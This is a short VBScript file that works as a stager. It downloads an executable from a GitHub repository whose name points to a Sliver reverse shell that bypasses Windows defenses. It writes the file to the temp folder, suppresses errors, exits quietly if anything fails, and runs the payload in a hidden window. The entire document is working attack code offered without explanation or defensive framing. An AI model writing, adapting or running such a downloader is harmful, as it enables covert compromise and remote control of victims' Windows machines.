Dim url, localFile, fso, objHTTP, objStream, objShell

url = "https://github.com/Jayakharan/Sliver_Reverse_Shell_Windows_Bypass/raw/main/CodeX.exe"

Set fso = CreateObject("Scripting.FileSystemObject")
localFile = fso.GetSpecialFolder(2) & "\CodeX.exe"

On Error Resume Next

' Use ServerXMLHTTP (best for silent scripts)
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
If objHTTP Is Nothing Then Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
If objHTTP Is Nothing Then Set objHTTP = CreateObject("Microsoft.XMLHTTP")

objHTTP.Open "GET", url, False
objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
objHTTP.Send

' If download failed, just quit silently
If Err.Number <> 0 Or objHTTP.Status <> 200 Then
    WScript.Quit
End If

' Save file silently
Set objStream = CreateObject("ADODB.Stream")
objStream.Open
objStream.Type = 1
objStream.Write objHTTP.ResponseBody
objStream.SaveToFile localFile, 2
objStream.Close

If Err.Number <> 0 Then
    WScript.Quit
End If

' Run the exe hidden (no window)
Set objShell = CreateObject("WScript.Shell")
objShell.Run """" & localFile & """", 0, False

' Cleanup
Set objShell = Nothing
Set objHTTP = Nothing
Set objStream = Nothing
Set fso = Nothing